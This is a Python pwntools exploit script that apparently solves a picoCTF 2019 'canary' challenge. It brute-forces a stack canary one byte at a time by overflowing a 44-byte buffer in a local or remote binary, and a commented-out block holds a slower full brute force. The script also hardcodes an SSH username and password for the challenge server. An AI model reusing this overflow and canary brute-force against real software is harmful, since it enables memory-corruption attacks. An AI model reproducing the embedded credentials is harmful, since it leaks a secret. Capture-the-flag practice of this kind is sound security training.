from pwn import *

# Config
LOCAL = True
WRITE = True

# Setup
context.log_level = 2 # 'debug'  # 10
prob_dir = '/problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328/'
exe = 'vuln'
if not LOCAL:
    s = ssh(host='2019shell1.picoctf.com', user='thomasvn', password='#8L7Z#Fj')

# ASSUME ASCII
# Brute force the canary (all hex permutations)
##################################################
# Inefficient Brute Force
##################################################
# for i in range(128):
#     for j in range(128):
#         for k in range(128):
#             for l in range(128):
#                 canary = chr(i) + chr(j) + chr(k) + chr(l)
#                 canary = canary.encode('ascii')

#                 if LOCAL:
#                     sh = process('./' + exe)
#                 else:
#                     sh = s.process(prob_dir + exe, cwd=prob_dir)
    
#                 # Build exploit
#                 cmd = b'A' * 44   # buffer
#                 cmd += canary
#                 cmd_len = len(cmd)

#                 # Test it
#                 sh.sendlineafter('> ', str(cmd_len))
#                 sh.sendlineafter('> ', cmd)
#                 res = sh.recvall()
#                 if b'Stack Smashing Detected' not in res:
#                     print(canary)
#                     print(hex(canary))
#                     exit()

##################################################
# Slightly Smarter Brute Force
##################################################
canary = b''
for i in range(4):
    for j in range(128):
        test_canary = chr(j).encode('ascii')

        if LOCAL:
            sh = process('./' + exe)
        else:
            sh = s.process(prob_dir + exe, cwd=prob_dir)

        # Build exploit
        cmd = b'A' * 44   # buffer
        cmd += (canary + test_canary)
        cmd_len = len(cmd)

        # Test it
        sh.sendlineafter('> ', str(cmd_len))
        sh.sendlineafter('> ', cmd)
        res = sh.recvall()
        if b'Stack Smashing Detected' not in res:
            print(test_canary)
            canary += test_canary
            break

print(canary)